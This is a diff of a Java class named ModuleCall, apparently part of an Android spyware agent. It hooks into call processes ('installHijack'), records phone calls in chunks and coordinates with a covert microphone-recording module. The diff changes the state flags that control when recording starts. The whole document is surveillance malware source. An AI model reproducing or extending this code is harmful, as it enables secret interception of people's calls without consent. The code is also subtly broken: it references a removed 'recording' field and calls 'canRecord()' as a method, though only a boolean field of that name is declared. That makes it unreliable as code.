@@ -106,7 +106,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private CallInfo callInfo;
 	private List<Chunk> chunks = new ArrayList<Chunk>();
 	private boolean[] finished = new boolean[2];
-	private boolean recording;
+	private boolean canRecord = false;
+	private boolean isStarted = false;
 	private Object recordingLock = new Object();
 
 	public static ModuleCall self() {
@@ -137,9 +138,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	@Override
 	public void actualStart() {
+		isStarted=false;
 		ListenerCall.self().attach(this);
 
-		runningProcesses = new RunningProcesses();
+		runningProcesses = RunningProcesses.self();
 		callInfo = new CallInfo();
 
 		if (recordFlag) {
@@ -176,7 +178,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				}
 
 				if (installHijack()) {
-					if (ModuleMic.self() != null) {
+					if (isMicAvailable()) {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (resume) can't switch on mic because call is on");
 						}
@@ -193,6 +195,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 			}
 		}
+		isStarted=true;
 	}
 
 	private boolean installedWhitelist() {
@@ -243,10 +246,11 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				hijack.killProc();
 			}
 
-			if (ModuleMic.self() != null) {
+			if (isMicAvailable()) {
 				ModuleMic.self().resetBlacklist();
 			}
 		}
+		canRecord = false;
 	}
 
 	private void startWatchAudio() {
@@ -301,15 +305,19 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		observer.startWatching();
 	}
-
+	private boolean isMicAvailable(){
+		return ModuleMic.self() != null && ModuleCall.self().isSuspended() && !ModuleCall.self().canRecord();
+	}
 	private boolean installHijack() {
 		// Initialize the callback system
 
-		if (ModuleMic.self() != null) {
-			ModuleMic.self().suspend();
-			// ModuleMic.self().addBlacklist("skype");
-			// ModuleMic.self().addBlacklist("viber");
+		if (isMicAvailable()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installHijack), Cannot start, because Mic is running");
+			}
+			return false;
 		}
+
 
 		hjcb = new CallBack();
 		hjcb.register(new HijackCallBack());
@@ -929,5 +937,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	public boolean isRecording() {
 		return recording;
+	}
+
+	public boolean isBooted() {
+		return isStarted;
 	}
 }
